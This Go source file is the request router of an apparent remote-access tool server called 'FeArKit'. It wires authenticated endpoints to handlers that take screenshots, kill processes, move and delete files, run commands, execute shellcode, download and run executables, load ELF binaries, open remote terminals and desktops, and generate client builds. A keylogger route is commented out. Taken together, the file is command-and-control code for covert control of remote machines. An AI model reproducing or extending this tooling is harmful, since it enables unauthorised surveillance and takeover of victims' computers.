package handler

import (
	"FeArKit/server/handler/bridge"
	"FeArKit/server/handler/desktop"
	"FeArKit/server/handler/file"
	"FeArKit/server/handler/generate"
	"FeArKit/server/handler/process"
	"FeArKit/server/handler/screenshot"
	"FeArKit/server/handler/terminal"
	"FeArKit/server/handler/shellcode"
	"FeArKit/server/handler/executable"
	"FeArKit/server/handler/utility"
	"github.com/gin-gonic/gin"
)

var AuthHandler gin.HandlerFunc

// InitRouter will initialize http and websocket routers.
func InitRouter(ctx *gin.RouterGroup) {
	ctx.Any(`/bridge/push`, bridge.BridgePush)
	ctx.Any(`/bridge/pull`, bridge.BridgePull)
	ctx.Any(`/client/update`, utility.CheckUpdate) // Client, for update.
	group := ctx.Group(`/`, AuthHandler)
	{
		group.POST(`/device/screenshot/get`, screenshot.GetScreenshot)
		group.POST(`/device/process/list`, process.ListDeviceProcesses)
		group.POST(`/device/process/kill`, process.KillDeviceProcess)
		group.POST(`/device/file/remove`, file.RemoveDeviceFiles)
		group.POST(`/device/file/upload`, file.UploadToDevice)
		group.POST(`/device/file/list`, file.ListDeviceFiles)
		group.POST(`/device/file/text`, file.GetDeviceTextFile)
		group.POST(`/device/file/get`, file.GetDeviceFiles)
		group.POST(`/device/exec`, utility.ExecDeviceCmd)
		group.POST(`/device/shellcode`, shellcode.ExecDeviceShellcode)
		group.POST(`/device/executable`, executable.DownloadAndExecute)
		group.POST(`/device/loadelf`, shellcode.LoadElf)
		//group.POST(`/device/keylogger/start`, keylogger.StartKeylogger)
		group.POST(`/device/list`, utility.GetDevices)
		group.POST(`/device/:act`, utility.CallDevice)
		group.POST(`/client/check`, generate.CheckClient)
		group.POST(`/client/generate`, generate.GenerateClient)
		group.Any(`/device/terminal`, terminal.InitTerminal)
		group.Any(`/device/desktop`, desktop.InitDesktop)
	}
}
